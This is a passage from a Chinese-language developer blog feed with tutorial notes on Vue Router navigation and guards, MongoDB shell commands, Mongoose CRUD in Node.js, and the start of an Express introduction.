 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以 push模式 跳轉到指定路由</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;routeName&#x27;</span>,</span><br><span class="line">    <span class="attr">params</span>:&#123;</span><br><span class="line">        <span class="attr">id</span>:xxx,</span><br><span class="line">        <span class="attr">title</span>:xxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 replace模式 跳轉到指定路由</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">replace</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;routeName&#x27;</span>,</span><br><span class="line">    <span class="attr">params</span>:&#123;</span><br><span class="line">        <span class="attr">id</span>:xxx,</span><br><span class="line">        <span class="attr">title</span>:xxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">forward</span>()  <span class="comment">// 前進</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">back</span>()     <span class="comment">// 後退</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">go</span>(n)      <span class="comment">// 取決於 n 的數值前進或後退</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="緩存路由組件"><a href="#緩存路由組件" class="headerlink" title="緩存路由組件"></a>緩存路由組件</h2><ol>
<li><p>作用：讓不展示的路由組件保持掛載，不被銷毀</p>
</li>
<li><p>具體代碼：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 使用 include 指定需要保持掛載的組件 --&gt;</span><br><span class="line">&lt;keep-alive include=&quot;componentName&quot;&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line">&lt;!-- 使用 include 指定多個組件 --&gt;</span><br><span class="line">&lt;keep-alive :include=&quot;[&#x27;component1&#x27;,&#x27;component2&#x27;]&quot;&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由的兩個生命週期鉤子"><a href="#路由的兩個生命週期鉤子" class="headerlink" title="路由的兩個生命週期鉤子"></a>路由的兩個生命週期鉤子</h2><ol>
<li><p>作用：路由組件所獨有的兩個鉤子，用於捕獲路由組件的激活狀態</p>
</li>
<li><p>具體代碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路由組件被激活時觸發</span></span><br><span class="line"><span class="title function_">activated</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由組件失去激活時觸發</span></span><br><span class="line"><span class="title function_">deactivated</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由守衛"><a href="#路由守衛" class="headerlink" title="路由守衛"></a>路由守衛</h2><ol>
<li><p>作用：對路由進行權限控制</p>
</li>
<li><p>全局路由守衛：用於監測所有路由切換</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局前置路由守衛 ———— 初始化的時候被調用、每次路由切換之前被調用</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">meta</span>.<span class="property">isAuth</span>)&#123;     <span class="comment">// 判斷是否需要鑒定權限</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;CUHK&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">next</span>()  <span class="comment">// 放行</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;No auth to enter!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">next</span>()  <span class="comment">// 放行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局後置路由守衛 ———— 初始化的時候被調用、每次路由切換之後被調用</span></span><br><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span></span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = to.<span class="property">meta</span>.<span class="property">title</span> || <span class="string">&#x27;Main Page&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>獨享路由守衛：用於監測指定的路由切換</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">beforeEnter</span>: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">meta</span>.<span class="property">isAuth</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;CUHK&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">next</span>()</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;No auth to enter!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>備註：獨享路由守衛並沒有切換後的函數設置</li>
</ul>
</li>
<li><p>組件內路由守衛</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 進入路由守衛 ———— 通過路由規則，進入該組件時被調用</span></span><br><span class="line"><span class="title function_">beforeRouteEnter</span>(<span class="params">to, <span class="keyword">from</span>, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">meta</span>.<span class="property">isAuth</span>)&#123;     <span class="comment">// 判斷是否需要鑒定權限</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;CUHK&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">next</span>()</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;No auth to enter!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 離開路由守衛 ———— 通過路由規則，離開該組件時被調用</span></span><br><span class="line"><span class="title function_">beforeRouteLeave</span>(<span class="params">to, <span class="keyword">from</span>, next</span>)&#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由器的兩種工作模式"><a href="#路由器的兩種工作模式" class="headerlink" title="路由器的兩種工作模式"></a>路由器的兩種工作模式</h2><ol>
<li><p>對於url而言，hash值就是 ———— #及其後面的內容</p>
</li>
<li><p>hash值不會包含在HTTP請求中，即：hash值不會帶給服務器</p>
</li>
<li><p>hash模式：</p>
<ol>
<li>地址中永遠帶著 # 符號</li>
<li>若以後講地址通過第三方手機app分享，若app校驗嚴格，則地址會被標記為不合法</li>
<li>兼容性好</li>
</ol>
</li>
<li><p>history模式：</p>
<ol>
<li>地址美觀</li>
<li>兼容性和hash模式相比略差</li>
<li>應用部署上線時需要後端人員支持，解決刷新頁面服務器404問題</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS &amp; MongoDB Interaction</title>
    <url>/myBlog/2022/08/05/2022/BackEnd/2022-8-5-NodeJS-MongoDB/</url>
    <content><![CDATA[<h1 id="MongoDB-交互"><a href="#MongoDB-交互" class="headerlink" title="MongoDB 交互"></a>MongoDB 交互</h1><h2 id="數據庫"><a href="#數據庫" class="headerlink" title="數據庫"></a>數據庫</h2><ol>
<li><p>關係型數據庫 (SQL)</p>
<ul>
<li><code>sql</code>語句增刪改查操作</li>
<li>保持事務的一致性</li>
</ul>
</li>
<li><p>非關係型數據庫 (No-SQL)</p>
<ul>
<li>不用<code>sql</code>語句</li>
<li>輕量、高效、自由</li>
</ul>
</li>
<li><p>數據庫概念：</p>
<table>
<thead>
<tr>
<th align="center">SQL術語</th>
<th align="center">MongoDB術語</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">database</td>
<td align="center">database</td>
<td align="center">數據庫</td>
</tr>
<tr>
<td align="center">table</td>
<td align="center">collection</td>
<td align="center">數據庫表</td>
</tr>
<tr>
<td align="center">row</td>
<td align="center">document</td>
<td align="center">數據紀錄文檔</td>
</tr>
<tr>
<td align="center">column</td>
<td align="center">field</td>
<td align="center">數據字段</td>
</tr>
<tr>
<td align="center">index</td>
<td align="center">index</td>
<td align="center">索引</td>
</tr>
<tr>
<td align="center">table.joins</td>
<td align="center"></td>
<td align="center">表連結，MongoDB不支持</td>
</tr>
<tr>
<td align="center">primary key</td>
<td align="center">primary key</td>
<td align="center">主鍵，id</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="MongoDB基本使用"><a href="#MongoDB基本使用" class="headerlink" title="MongoDB基本使用"></a>MongoDB基本使用</h2><h3 id="數據庫基本使用"><a href="#數據庫基本使用" class="headerlink" title="數據庫基本使用"></a>數據庫基本使用</h3><ol>
<li><p>啟動數據庫：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mongod --dbpath <span class="string">&#x27;storage path&#x27;</span></span><br><span class="line">./mongo</span><br></pre></td></tr></table></figure>


</li>
<li><p>操作數據庫：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 查詢當前數據庫</span></span><br><span class="line"><span class="keyword">show</span> dbs</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 查看當前數據庫</span></span><br><span class="line">db</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 切換數據庫，沒有就創建</span></span><br><span class="line">use <span class="string">&#x27;collName&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 插入集合</span></span><br><span class="line">db.createCollection(<span class="string">&#x27;users&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 刪除數據庫</span></span><br><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>


</li>
<li><p>操作集合：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 設置集合（最大儲存5M內容，最多存儲5000個文檔集合）</span></span><br><span class="line">db.createCollection(<span class="string">&#x27;users&#x27;</span>, &#123;size:<span class="number">5242880</span>, capped:<span class="literal">true</span>, max:<span class="number">5000</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 獲取指定名稱 (users) 的集合</span></span><br><span class="line">db.getCollection(<span class="string">&#x27;users&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 獲取數據庫中的所有集合</span></span><br><span class="line">db.getCollectionNames()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 刪除 (users) 集合</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">drop</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="文檔的增刪改"><a href="#文檔的增刪改" class="headerlink" title="文檔的增刪改"></a>文檔的增刪改</h3><ol>
<li><p>添加：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 字段、字域都可以不一樣（自由）</span></span><br><span class="line"><span class="comment">-- 1. (users) 添加文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.save(&#123;username:<span class="string">&#x27;Donald&#x27;</span>, age:<span class="number">18</span>&#125;)</span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.save(&#123;myName:<span class="string">&#x27;Donald&#x27;</span>, myAge:<span class="number">18</span>, gender:<span class="string">&#x27;M&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. (users) 同時添加多個文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.save([&#123;username:<span class="string">&#x27;May&#x27;</span>, age:<span class="number">19</span>&#125;, &#123;username:<span class="string">&#x27;John&#x27;</span>, age:<span class="number">20</span>&#125;])</span><br></pre></td></tr></table></figure>


</li>
<li><p>刪除：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 刪除所有 myAge 屬性且值為 18 的文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.remove(&#123;myAge:<span class="number">18</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 刪除所有文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.remove(&#123;&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>修改：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 將第一個有 username:&#x27;Donald&#x27; 的文檔替換為 &#123;age:200&#125; 這個文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">update</span>(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;, &#123;age:<span class="number">200</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 只是修改屬性中對應的值</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">update</span>(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;, &#123;$<span class="keyword">set</span>:&#123;age:<span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 將屬性中的值增加 10</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">update</span>(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;, &#123;$inc:&#123;age:<span class="number">10</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="文檔的查詢"><a href="#文檔的查詢" class="headerlink" title="文檔的查詢"></a>文檔的查詢</h3><ol>
<li><p>查詢：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 查詢所有文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 查詢含有該屬性的文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢值：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 值等於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:<span class="number">22</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 值大於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$gt:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 值小於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$lt:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 值大於等於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$gte:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 值小於等於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$lte:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 值大於等於 23 並 小於等於 26</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$gte:<span class="number">23</span>, $lte:<span class="number">26</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>正則表達式查詢：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="operator">/</span>a<span class="operator">/</span>&#125;)</span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="operator">/</span><span class="operator">^</span>D<span class="operator">/</span>&#125;)</span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="operator">/</span>d$<span class="operator">/</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢指定字段：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 只要 username 這個字段</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;, &#123;username:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 只要 username 和 age 這個字段</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;, &#123;username:<span class="number">1</span>, age:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 只要 username 而且不要顯示 __id</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;, &#123;username:<span class="number">1</span>, _id:<span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>排序顯示：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 正序顯示</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;).sort(&#123;age:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 倒序顯示</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;).sort(&#123;age:<span class="number">-1</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢數據列位：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 一頁有 n 條數據，每一頁的查詢</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find().<span class="keyword">skip</span>((pageNum <span class="operator">-</span> <span class="number">1</span>) <span class="operator">*</span> n).limit(n)</span><br><span class="line"><span class="comment">-- 查詢第 2 頁的數據，每一頁有5條數據</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find().<span class="keyword">skip</span>((<span class="number">2</span><span class="number">-1</span>)<span class="operator">*</span><span class="number">5</span>).limit(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>


</li>
<li><p><code>or</code>與查詢：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查詢 age:20 或 age:25 的文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;$<span class="keyword">or</span>:[&#123;age:<span class="number">20</span>&#125;, &#123;age:<span class="number">25</span>&#125;]&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢集結裡文檔的總數：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find().<span class="built_in">count</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="NodeJS操作"><a href="#NodeJS操作" class="headerlink" title="NodeJS操作"></a>NodeJS操作</h2><h3 id="連接數據庫"><a href="#連接數據庫" class="headerlink" title="連接數據庫"></a>連接數據庫</h3><ol>
<li><p>安裝<code>mongoose</code>模塊：</p>
<ul>
<li>用戶操作數據庫  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i mongoose</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>連接數據庫：</p>
<ul>
<li><p>創建<code>config</code>文件添加<code>db.config.js</code>文件</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入 mongoose 模塊</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>)</span><br><span class="line"><span class="comment">// 連接並自動創建 donald_project 數據庫</span></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://127.0.0.1:27017/donald_project&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>app.js</code>或<code>www</code>入口文件引入</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;../config/db.config&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>創建集合：</p>
<ul>
<li>創建<code>model</code>文件專門放置模型</li>
<li>新建<code>UserModel.js</code>文件創建<code>users</code>集合  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// user模型</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Schema</span> = mongoose.<span class="property">Schema</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制集合中的字段與類型</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserType</span> = &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="title class_">Number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建模型</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserModel</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;user&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Schema</span>(<span class="title class_">UserType</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模型 user 將會對應 users 集合（集合名字 = 模型名字 + s）</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">UserModel</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>路由中操作數據庫：</p>
<ul>
<li>引入模型即可進行操作  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">UserModel</span> = <span class="built_in">require</span>(<span class="string">&#x27;../model/UserModel&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="數據庫操作"><a href="#數據庫操作" class="headerlink" title="數據庫操作"></a>數據庫操作</h3><ol>
<li><p>添加：</p>
<ul>
<li>使用<code>Model.create()</code>方法添加文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 結構賦值 AJAX 傳來的數據</span></span><br><span class="line"><span class="keyword">const</span> &#123;username, password, age&#125; = req.<span class="property">body</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">create</span>(       <span class="comment">// 往模型添加文檔：&#123; 內容 &#125;</span></span><br><span class="line">    &#123;username, password, age&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>刪除：</p>
<ul>
<li>使用<code>Model.deleteOne()</code>方法刪除第一個符合條件的文檔</li>
<li>使用<code>Model.deleteMany()</code>方法刪除所有符合條件的文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">deleteOne</span>(    <span class="comment">// 刪除指定文檔：&#123; 條件 &#125;</span></span><br><span class="line">    &#123;<span class="attr">_id</span>:req.<span class="property">params</span>.<span class="property">id</span>&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>更改：</p>
<ul>
<li>使用<code>Model.updateOne()</code>方法更改第一個符合條件的文檔</li>
<li>使用<code>Model.updateMany()</code>方法更改所有符合條件的文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">updateOne</span>(    <span class="comment">// 更改指定文檔：&#123; 條件 &#125;, &#123; 內容 &#125;</span></span><br><span class="line">    &#123;<span class="attr">_id</span>:req.<span class="property">params</span>.<span class="property">id</span>&#125;, &#123;username, password, age&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>查詢：</p>
<ul>
<li>使用<code>Model.find()</code>方法查詢符合條件的文檔</li>
<li>可以追加<code>sort()</code>、<code>skip()</code>、<code>limit()</code>方法</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">find</span>(</span><br><span class="line">    &#123;&#125;,                     <span class="comment">// 查詢條件</span></span><br><span class="line">    [<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;age&#x27;</span>]     <span class="comment">// 獲取指定字段</span></span><br><span class="line">)</span><br><span class="line">.<span class="title function_">sort</span>(&#123;<span class="attr">age</span>:-<span class="number">1</span>&#125;)             <span class="comment">// 按照 age 倒序排序</span></span><br><span class="line">.<span class="title function_">skip</span>((page - <span class="number">1</span>) * limit).<span class="title function_">limit</span>(limit)  <span class="comment">// 指定頁面返回對應的文檔數</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(data)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Web BackEnd</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - Express</title>
    <url>/myBlog/2022/08/03/2022/BackEnd/2022-8-3-NodeJS-Express/</url>
    <content><![CDATA[<h2 id="express簡介"><a href="#express簡介" class="headerlink" title="express簡介"></a>express簡介</h2><ol>
<li><p><code>express</code>簡介：</p>
<ul>
<li>基於 Node.js 平台，快速、開放、極簡的<font color="#f54747"> Web 開發框架</font></li>
<li>作用和 Node.js 內置的<code>http</code>模塊類似，專門用於創建 Web 服務器的</li>
</ul>
</li>
<li><p><code>express</code>本質：</p>
<ul>
<li><code>npm</code>上的第三方包，提供了快速創建 Web 服務器的便捷方法</li>
<li>官方網址：<a href="https://expressjs.com/zh-tw/">https://expressjs.com/zh-tw/</a></li>
</ul>
</li>
<li><p><code>express</code>運用場景：  </p>
<ul>
<li><font color="#f54747">Web 網站服務器</font>：專門對外提供 Web 網頁資源的服務器</li>
<li><font color="#f54747">API 接口服務器</font>：專門對外提供 API 接口的服務器</li>
<li>使用<code>express</code>可以方便、快捷的創造 Web 網站服務器或 API 接口服務器</li>
</ul>
</li>
</ol>
<h2 id="express基本使用"><a href="#express基本使用" class="headerlink" title="express基本使用"></a>express基本使用</h2><ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i express</span><br></pre></td></tr></table></figure>

</li>
<li><p>創建Web服務器：</p>
<ul>
<li>使用<code>express</code>創建服務器</li>
